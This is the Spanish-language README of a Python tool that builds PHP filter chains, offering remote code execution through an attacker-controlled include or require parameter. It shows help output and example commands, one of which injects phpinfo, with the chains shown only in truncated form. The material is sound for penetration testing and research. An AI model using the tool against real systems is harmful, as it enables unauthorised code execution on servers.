

# Generador de cadenas de filtros PHP

Una herramienta de línea de comandos (CLI) para generar cadenas de filtros en PHP, que te permite obtener RCE (Remote Code Execution) sin subir archivos, si tienes control total sobre el parámetro que se pasa a `require` o `include` en PHP.

## Uso

### Ayuda

```bash
$ python3 php_filter_chain_generator.py --help             
usage: php_filter_chain_generator.py [-h] [--chain CHAIN] [--rawbase64 RAWBASE64]

Generador de cadenas de filtros PHP.

opciones opcionales:
  -h, --help            Muestra este mensaje de ayuda y sale
  --chain CHAIN         Contenido que deseas generar (posiblemente necesites añadir espacios para que tu payload funcione).
  --rawbase64 RAWBASE64 Valor en base64 que deseas probar. La cadena se imprimirá en base64 por PHP, útil para depuración.
```

### Parámetros

- **chain**: Una cadena de filtros PHP que deseas inyectar.

Ejemplo de una cadena de filtros que genera `<?php phpinfo(); ?>`:

```bash
$ python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '
[+] La siguiente cadena generará el código: <?php phpinfo(); ?>   (valor base64: PD9waHAgcGhwaW5mbygpOyA/PiAg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|...
```

La cadena `<?php phpinfo(); ?>` se inserta correctamente:
```bash
php -r "echo file_get_contents('php://filter/...');"
<?php phpinfo(); ?> ...
```

- **rawbase64**: Introduce el valor en base64 que se añadirá antes de la última decodificación. Útil para depurar tus cadenas de filtros PHP.

Ejemplo de prueba para verificar si una cadena funciona correctamente:

```bash
$ python3 php_filter_chain_generator.py --rawbase64 'cwwwwc'
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|...
```

El valor base64 `'cwwwc'` se inserta como se esperaba, sin alteraciones, por lo que la cadena es válida:
```bash
$ php -r "echo file_get_contents('php://filter/...');"
cwwwwc...
```

### Mejoras futuras

- Las cadenas de este repositorio podrían acortarse significativamente utilizando alias más cortos; sería útil implementarlo en el futuro.
- Algunas cadenas podrían simplificarse para reducir el tamaño de los filtros.
